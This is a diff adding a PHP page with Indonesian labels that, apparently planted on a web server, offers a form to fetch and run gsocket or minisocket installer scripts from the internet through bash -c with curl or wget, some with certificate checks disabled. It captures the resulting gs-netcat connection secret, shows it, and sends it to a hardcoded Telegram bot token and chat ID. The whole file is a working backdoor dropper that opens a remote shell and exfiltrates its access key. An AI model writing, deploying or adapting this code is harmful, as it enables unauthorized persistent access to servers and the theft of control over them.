@@ -1,0 +1,119 @@
+<?php
+// Cek jika form disubmit
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Ambil pilihan dari form
+    $pilihan = $_POST['pilihan'];
+
+    // Tentukan perintah berdasarkan pilihan yang dipilih
+    $perintah = '';
+
+    switch ($pilihan) {
+        case '1':
+            $perintah = 'bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"';
+            break;
+        case '2':
+            $perintah = 'GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"';
+            break;
+        case '3':
+            $perintah = 'GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"';
+            break;
+        case '4':
+            $perintah = 'GS_NOCERTCHECK=1 bash -c "$(curl --no-check-certificate -qO- https://gsocket.io/x)"';
+            break;
+        case '5':
+            $perintah = 'bash -c "$(curl -fsSL https://minisocket.io/bin/x)"';
+            break;
+        default:
+            echo "Pilihan tidak valid.";
+            exit;
+    }
+
+    // Menyiapkan proses menggunakan proc_open
+    $descriptorspec = array(
+        0 => array("pipe", "r"),  // stdin - input ke perintah
+        1 => array("pipe", "w"),  // stdout - output dari perintah
+        2 => array("pipe", "w")   // stderr - error dari perintah
+    );
+
+    // Membuka proses
+    $process = proc_open($perintah, $descriptorspec, $pipes);
+
+    if (is_resource($process)) {
+        // Membaca output dari stdout
+        $output = stream_get_contents($pipes[1]);
+
+        // Menutup pipes dan proses
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        proc_close($process);
+
+        // Menampilkan hanya bagian gs-netcat -s "MySecret" -i
+        if (preg_match('/gs-netcat\s-s\s"[^"]*"\s-i/', $output, $matches)) {
+            $result = implode("\n", $matches);
+            echo "<h3>HASILNYA TUAN:</h3><pre>" . $result . "</pre>";
+
+            // Kirimkan hasil ke Telegram
+            sendToTelegram($result);
+        } else {
+            echo "<h3>Perintah tidak ditemukan dalam output.</h3>";
+        }
+    } else {
+        echo "Terjadi kesalahan saat menjalankan perintah.";
+    }
+}
+
+// Fungsi untuk mengirim pesan ke Telegram
+function sendToTelegram($message) {
+    $token = "8225830236:AAHmDuBQr1crg5oJJK5ROvbgsHpW-FCJH8A"; // Ganti dengan token bot Anda
+    $chatId = "6927068182"; // Ganti dengan chat ID Anda
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+
+    $data = array(
+        'chat_id' => $chatId,
+        'text' => $message
+    );
+
+    // Kirimkan permintaan POST ke Telegram
+    $options = array(
+        'http' => array(
+            'method'  => 'POST',
+            'header'  => 'Content-type: application/x-www-form-urlencoded',
+            'content' => http_build_query($data)
+        )
+    );
+    $context = stream_context_create($options);
+    file_get_contents($url, false, $context); // Kirim permintaan
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pilih Perintah</title>
+</head>
+<body>
+    <h2>Pilih Perintah untuk Dijalankan</h2>
+    <form method="POST">
+        <label for="pilihan">Pilih salah satu:</label><br>
+        <input type="radio" id="pilihan1" name="pilihan" value="1">
+        <label for="pilihan1">1. Ambil Gsocket</label><br>
+
+        <input type="radio" id="pilihan2" name="pilihan" value="2">
+        <label for="pilihan2">2. Hapus Gsocket</label><br>
+
+        <input type="radio" id="pilihan3" name="pilihan" value="3">
+        <label for="pilihan3">3. ?</label><br>
+
+        <input type="radio" id="pilihan4" name="pilihan" value="4">
+        <label for="pilihan4">4. ?</label><br>
+
+        <input type="radio" id="pilihan5" name="pilihan" value="5">
+        <label for="pilihan5">5. Mini Socket</label><br>
+
+        <br>
+        <button type="submit">Start</button>
+    </form>
+</body>
+</html>
